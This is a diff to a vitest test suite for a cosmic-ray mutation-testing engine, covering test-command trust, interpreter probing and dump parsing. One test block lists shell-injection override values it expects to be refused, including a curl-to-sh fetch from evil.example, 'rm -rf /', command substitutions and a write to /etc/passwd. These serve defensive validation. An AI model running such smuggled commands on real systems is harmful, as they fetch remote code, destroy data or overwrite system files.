@@ -204,6 +204,35 @@ describe('PythonEngine (cosmic-ray)', () => {
     expect(lastConfig()).toContain('test-command = "python -m unittest"');
   });
 
+  it('never writes a config that silently discards a project-declared pytest command', async () => {
+    // The real shape of a `pyproject.toml [tool.mutmut] runner` key. It used to
+    // be thrown away and replaced by a bare `pytest -x -q` — running a DIFFERENT
+    // suite than the project declared (pytest-randomly and pytest-cov back on,
+    // when the project had switched them off deliberately) under every
+    // per-mutant invocation, with no throw and no warning. The engine must
+    // either honour it or refuse; it must never write the substitute.
+    await expect(
+      engine.run('m.py', {
+        workDir: '/tmp/sandbox',
+        testRunner: 'python -m pytest --no-cov -p no:randomly -p no:cacheprovider',
+      }),
+    ).rejects.toThrow(/Refusing to run the test command/);
+    expect(mockWriteFileSync).not.toHaveBeenCalled();
+    expect(mockRunShell).not.toHaveBeenCalled();
+  });
+
+  it('honours the same command verbatim when the operator supplied it', async () => {
+    // The trusted/untrusted split is what makes the refusal above actionable:
+    // moving the command into `"cosmicray": { "testRunner": "…" }` runs it.
+    queueRun('');
+    await engine.run('m.py', {
+      workDir: '/tmp/sandbox',
+      testRunner: 'python -m pytest --no-cov -p no:randomly',
+      testRunnerTrusted: true,
+    });
+    expect(lastConfig()).toContain('test-command = "python -m pytest --no-cov -p no:randomly"');
+  });
+
   it('runs each subcommand in the sandbox workDir', async () => {
     queueRun('');
     await engine.run('m.py', { workDir: '/tmp/sandbox' });
@@ -280,11 +309,15 @@ describe('PythonEngine (cosmic-ray)', () => {
     const realPath = await vi.importActual<typeof import('node:path')>('node:path');
 
     const binDir = realFs.mkdtempSync(realPath.join(realOs.tmpdir(), 'chaos-pybin-'));
-    // Exits 0 ONLY for `--version`, so the probe's argument list is part of what
-    // is being asserted: probing with no arguments (or a blank one) fails here.
+    // UPDATED: the shim used to exit 0 only for `--version`, pinning the old
+    // probe's argument list. `--version` exiting 0 proves only that SOMETHING
+    // ran — a Python 2 answers it happily — so the probe now asks the
+    // interpreter to assert its own major version. The shim exits 0 only for
+    // `-c`, so the probe's argument list is still part of what is asserted:
+    // probing with no arguments (or with `--version`) fails here.
     realFs.writeFileSync(
       realPath.join(binDir, 'python'),
-      '#!/bin/sh\n[ "$1" = "--version" ] || exit 7\nexit 0\n',
+      '#!/bin/sh\n[ "$1" = "-c" ] || exit 7\nexit 0\n',
     );
     realFs.chmodSync(realPath.join(binDir, 'python'), 0o755);
 
@@ -351,6 +384,78 @@ describe('PythonEngine (cosmic-ray)', () => {
     }
   });
 
+  describe('CHAOS_MCP_PYTHON validation', () => {
+    // The override is string-concatenated into `${interpreter} -m pytest -x -q`
+    // and written into the cosmic-ray config as `test-command`, which cosmic-ray
+    // executes THROUGH A SHELL once per mutant. Its doc comment called it
+    // "deterministic, used by tests" and nothing enforced that: the elaborate
+    // BARE_EXECUTABLE_RE / isRepoTestCommandAllowed gate guarded the RUNNER half
+    // of the command and left the INTERPRETER half wide open.
+    it.each([
+      ['python3; curl http://evil.example | sh #'],
+      ['python3 && rm -rf /'],
+      ['$(whoami)'],
+      ['python3 -c "import os"'],
+      ['`id`'],
+      ['python3 > /etc/passwd'],
+      ['../../relative/python3'],
+    ])('refuses the shell-bearing override %j', async (override) => {
+      process.env.CHAOS_MCP_PYTHON = override;
+      const fresh = new PythonEngine();
+      await expect(fresh.run('m.py', { workDir: '/tmp/sandbox' })).rejects.toThrow(
+        /Refusing to use CHAOS_MCP_PYTHON=/,
+      );
+      // Nothing was spawned and no config was written — the run dies first.
+      expect(mockRunShell).not.toHaveBeenCalled();
+      expect(mockWriteFileSync).not.toHaveBeenCalled();
+    });
+
+    it.each([['python3'], ['python3.12'], ['py.test-3.11'], ['/opt/venv/bin/python3.12']])(
+      'accepts the legitimate override %j',
+      async (override) => {
+        process.env.CHAOS_MCP_PYTHON = override;
+        const fresh = new PythonEngine();
+        queueRun('');
+        await fresh.run('m.py', { workDir: '/tmp/sandbox' });
+        expect(lastConfig()).toContain(`test-command = "${override} -m pytest -x -q"`);
+      },
+    );
+  });
+
+  it('rejects a `python` on PATH that is not Python 3', async () => {
+    // `--version` exiting 0 proves only that SOMETHING ran: on the distributions
+    // where /usr/bin/python is still Python 2 it answers happily, every mutant
+    // then runs `python -m pytest` under Python 2 against a Python 3 suite, all
+    // come back incompetent, and the degenerate-run guard blames a missing
+    // interpreter while echoing a command that looks correct. The probe must ask
+    // the interpreter to assert its own major version instead.
+    const realFs = await vi.importActual<typeof import('node:fs')>('node:fs');
+    const realOs = await vi.importActual<typeof import('node:os')>('node:os');
+    const realPath = await vi.importActual<typeof import('node:path')>('node:path');
+
+    const binDir = realFs.mkdtempSync(realPath.join(realOs.tmpdir(), 'chaos-py2-'));
+    // A stand-in for Python 2: `--version` succeeds, but the version assertion
+    // (`sys.exit(0 if sys.version_info[0] == 3 else 1)`) exits 1.
+    realFs.writeFileSync(
+      realPath.join(binDir, 'python'),
+      '#!/bin/sh\n[ "$1" = "--version" ] && exit 0\nexit 1\n',
+    );
+    realFs.chmodSync(realPath.join(binDir, 'python'), 0o755);
+
+    delete process.env.CHAOS_MCP_PYTHON;
+    const savedPath = process.env.PATH;
+    process.env.PATH = binDir;
+    try {
+      const fresh = new PythonEngine();
+      queueRun('');
+      await fresh.run('m.py', { workDir: '/tmp/sandbox' });
+      expect(lastConfig()).toContain('test-command = "python3 -m pytest -x -q"');
+    } finally {
+      process.env.PATH = savedPath;
+      realFs.rmSync(binDir, { recursive: true, force: true });
+    }
+  });
+
   it('fails loudly when every mutant is incompetent (interpreter/test-command broken)', async () => {
     // baseline/init/exec all return exit 0 (cosmic-ray does not catch a missing
     // interpreter), and dump reports two mutants — both 'incompetent'. This must
@@ -399,6 +504,87 @@ describe('PythonEngine (cosmic-ray)', () => {
     const result = await engine.run('m.py', { workDir: '/tmp/sandbox' });
     expect(result.totalMutants).toBe(0);
     expect(result.mutationScore).toBe('100.00%');
+  });
+
+  it('blames the operator filter — not the interpreter — when every mutant was skipped', async () => {
+    // A `"cosmicray": { "excludeOperators": ["core/.*"] }` broad enough to match
+    // everything makes cr-filter-operators skip every mutant. Verified against
+    // the pinned cosmic-ray 8.4.6: the filter calls
+    // `set_result(job_id, WorkResult(worker_outcome=SKIPPED))`, which gives the
+    // mutant a RESULT row, so `dump` emits it with `test_outcome: null` — the
+    // old comment claiming skipped mutants are omitted from the dump was wrong.
+    // Those records incremented `completed` while contributing to nothing, so
+    // the guard fired with `incompetent === 0` and confidently blamed a missing
+    // Python interpreter / broken pytest. The real cause is the exclude list,
+    // and the message must say so and echo it.
+    const skipped = (op: string) =>
+      JSON.stringify([
+        { mutations: [{ operator_name: op, start_pos: [1, 1] }] },
+        { worker_outcome: 'skipped', output: 'Filtered operator', test_outcome: null },
+      ]);
+    mockRunShell
+      .mockResolvedValueOnce(ok()) // baseline
+      .mockResolvedValueOnce(ok()) // init
+      .mockResolvedValueOnce(ok()) // cr-filter-operators
+      .mockResolvedValueOnce(ok()) // exec
+      .mockResolvedValueOnce(ok([skipped('core/A'), skipped('core/B')].join('\n'))); // dump
+
+    const message = await rejectionMessage({
+      workDir: '/tmp/sandbox',
+      pythonExcludeOperators: ['core/.*'],
+    });
+
+    expect(message).toContain('2 came back with no test outcome at all');
+    expect(message).toContain('excludeOperators');
+    expect(message).toContain('["core/.*"]');
+    // The interpreter diagnosis must NOT fire — nothing was incompetent.
+    expect(message).not.toContain('interpreter or pytest is missing');
+  });
+
+  it('names the resolved interpreter, not just the command, in the incompetent diagnosis', async () => {
+    // `python --version` exiting 0 does not mean Python 3. Where /usr/bin/python
+    // is still Python 2 every mutant comes back incompetent and the guard blames
+    // a missing interpreter while echoing a command that LOOKS correct — so the
+    // message has to identify which interpreter actually ran.
+    mockRunShell
+      .mockResolvedValueOnce(ok())
+      .mockResolvedValueOnce(ok())
+      .mockResolvedValueOnce(ok())
+      .mockResolvedValueOnce(ok(dumpLine('core/A', 1, 'incompetent')));
+
+    expect(await rejectionMessage()).toMatch(/Resolved interpreter: "python" \(.*\)/);
+  });
+
+  it('points at excludeOperators when the dump step itself fails', async () => {
+    // cosmic-ray 8.4.6's `dump` raises AttributeError on any mutant the filter
+    // skipped (`result_to_dict` does `d["test_outcome"].value` on a None), so the
+    // whole dump exits 1. Without the hint the operator gets a raw traceback and
+    // no link to the option that caused it.
+    mockRunShell
+      .mockResolvedValueOnce(ok()) // baseline
+      .mockResolvedValueOnce(ok()) // init
+      .mockResolvedValueOnce(ok()) // filter
+      .mockResolvedValueOnce(ok()) // exec
+      .mockRejectedValueOnce(fail({ exit: 1, stderr: "AttributeError: 'NoneType'" })); // dump
+
+    const message = await rejectionMessage({
+      workDir: '/tmp/sandbox',
+      pythonExcludeOperators: ['core/.*'],
+    });
+    expect(message).toContain('cosmic-ray dump failed (exit 1)');
+    expect(message).toContain('excludeOperators');
+  });
+
+  it('leaves the dump failure message alone when no operator filter ran', async () => {
+    // The hint is conditional: appending it unconditionally would blame an
+    // option the caller never used.
+    mockRunShell
+      .mockResolvedValueOnce(ok())
+      .mockResolvedValueOnce(ok())
+      .mockResolvedValueOnce(ok())
+      .mockRejectedValueOnce(fail({ exit: 1, stderr: 'no session' }));
+
+    expect(await rejectionMessage()).toBe('cosmic-ray dump failed (exit 1): no session');
   });
 
   it('parseCosmicRayDump excludes incompetent mutants and reports the count', () => {
@@ -510,22 +696,123 @@ describe('PythonEngine (cosmic-ray)', () => {
       expect(r.vulnerabilities[0].description).toContain('line 42');
     });
 
-    it('survives a null work-item beside a real result', () => {
-      // cosmic-ray pairs [WorkItem, WorkResult]; a truncated session DB can
-      // yield a null item. Without the optional chain the whole dump parse
-      // throws and an otherwise-complete audit is lost.
+    it('refuses a null work-item beside a surviving result', () => {
+      // UPDATED. This used to assert `{ line: 0, mutator: 'Mutation' }` and
+      // justified it as "an otherwise-complete audit is lost" otherwise. That
+      // default is worse than the loss: suppression, verify and
+      // apply-suppressions all key survivors on `${line} ${mutator}`, so every
+      // unidentifiable survivor collapses onto the single key "0 Mutation" —
+      // suppressing one silently suppresses all of them, and verify reports
+      // phantom "now killed" mutants. The counts and the score stayed correct
+      // throughout (they come only from `test_outcome`), which is what made it
+      // silent. Failing loudly is the established posture in this file.
       const nullItem = JSON.stringify([null, { test_outcome: 'survived' }]);
-      const { result: r } = parseCosmicRayDump(nullItem, 'm.py');
-      expect(r.survived).toBe(1);
-      expect(r.vulnerabilities[0].line).toBe(0);
-      expect(r.vulnerabilities[0].mutator).toBe('Mutation');
+      expect(() => parseCosmicRayDump(nullItem, 'm.py')).toThrow(
+        /cosmic-ray dump shape not recognised/,
+      );
     });
 
-    it('falls back to line 0 and a generic operator when the record is bare', () => {
+    it('refuses a bare work-item record rather than emitting a colliding default', () => {
+      // UPDATED for the same reason as the null-item case above.
       const bare = JSON.stringify([{}, { test_outcome: 'survived' }]);
-      const { result: r } = parseCosmicRayDump(bare, 'm.py');
-      expect(r.vulnerabilities[0].line).toBe(0);
-      expect(r.vulnerabilities[0].mutator).toBe('Mutation');
+      expect(() => parseCosmicRayDump(bare, 'm.py')).toThrow(
+        /supports cosmic-ray >= 8\.3; got: \(no keys\)/,
+      );
+    });
+
+    it('reads the FLAT work-item shape emitted by cosmic-ray 8.3', () => {
+      // The nested `mutations[]` shape is 8.4+; earlier 8.x carried the same
+      // fields directly on the WorkItem. Only the CONTAINER path pins a version
+      // (containers/python/requirements.txt), and nothing probes
+      // `cosmic-ray --version`, so native mode runs whatever pipx installed.
+      // Reading only the nested shape turned every 8.3 survivor into the
+      // colliding "0 Mutation" default while leaving the score correct.
+      const flat = JSON.stringify([
+        {
+          job_id: 'j1',
+          module_path: 'm.py',
+          operator_name: 'core/NumberReplacer',
+          start_pos: [31, 4],
+        },
+        { test_outcome: 'survived', diff: '' },
+      ]);
+      const { result: r } = parseCosmicRayDump(flat, 'm.py');
+      expect(r.survived).toBe(1);
+      expect(r.vulnerabilities[0]).toMatchObject({ line: 31, mutator: 'core/NumberReplacer' });
+    });
+
+    it('prefers the nested mutations[] entry over any flat fields on the item', () => {
+      // Both shapes present (a hypothetical transitional build): the nested
+      // entry is authoritative, so the fallback must not shadow it.
+      const both = JSON.stringify([
+        {
+          operator_name: 'core/Flat',
+          start_pos: [1, 1],
+          mutations: [{ operator_name: 'core/Nested', start_pos: [99, 2] }],
+        },
+        { test_outcome: 'survived' },
+      ]);
+      const { result: r } = parseCosmicRayDump(both, 'm.py');
+      expect(r.vulnerabilities[0]).toMatchObject({ line: 99, mutator: 'core/Nested' });
+    });
+
+    it('falls back to the flat fields when mutations[] is present but empty', () => {
+      const emptyList = JSON.stringify([
+        { mutations: [], operator_name: 'core/Flat', start_pos: [7, 1] },
+        { test_outcome: 'survived' },
+      ]);
+      const { result: r } = parseCosmicRayDump(emptyList, 'm.py');
+      expect(r.vulnerabilities[0]).toMatchObject({ line: 7, mutator: 'core/Flat' });
+    });
+
+    it('keeps a half-populated record instead of throwing', () => {
+      // Only one of the two fields is missing, so the survivor still has a
+      // distinguishing key — the throw is reserved for records with neither.
+      const onlyOperator = JSON.stringify([
+        { mutations: [{ operator_name: 'core/OnlyName' }] },
+        { test_outcome: 'survived' },
+      ]);
+      const { result: r } = parseCosmicRayDump(onlyOperator, 'm.py');
+      expect(r.vulnerabilities[0]).toMatchObject({ line: 0, mutator: 'core/OnlyName' });
+
+      const onlyPos = JSON.stringify([
+        { mutations: [{ start_pos: [12, 3] }] },
+        { test_outcome: 'survived' },
+      ]);
+      const { result: r2 } = parseCosmicRayDump(onlyPos, 'm.py');
+      expect(r2.vulnerabilities[0]).toMatchObject({ line: 12, mutator: 'Mutation' });
+    });
+
+    it('counts a null test_outcome as unscored, not as killed/survived/incompetent', () => {
+      // cosmic-ray's WorkResult carries BOTH worker_outcome and test_outcome,
+      // and the latter is None whenever the worker never reached a test —
+      // notably `worker_outcome: "skipped"`, which is exactly what
+      // cr-filter-operators writes. Such a record used to increment `completed`
+      // while contributing to nothing, so the degenerate-run guard read it as
+      // "every mutant was incompetent".
+      const skipped = JSON.stringify([
+        { mutations: [{ operator_name: 'core/A', start_pos: [1, 1] }] },
+        { worker_outcome: 'skipped', output: 'Filtered operator', test_outcome: null },
+      ]);
+      const { result: r, completed, unscored } = parseCosmicRayDump(skipped, 'm.py');
+      expect(completed).toBe(1);
+      expect(unscored).toBe(1);
+      expect(r.incompetent).toBe(0);
+      expect(r.killed).toBe(0);
+      expect(r.survived).toBe(0);
+      expect(r.totalMutants).toBe(0);
+    });
+
+    it('counts an unrecognised test_outcome as unscored too', () => {
+      // A future cosmic-ray outcome must not be silently folded into any
+      // existing bucket.
+      const { unscored, result: r } = parseCosmicRayDump(
+        dumpLine('core/A', 1, 'something-new'),
+        'm.py',
+      );
+      expect(unscored).toBe(1);
+      expect(r.incompetent).toBe(0);
+      expect(r.totalMutants).toBe(0);
     });
   });
 
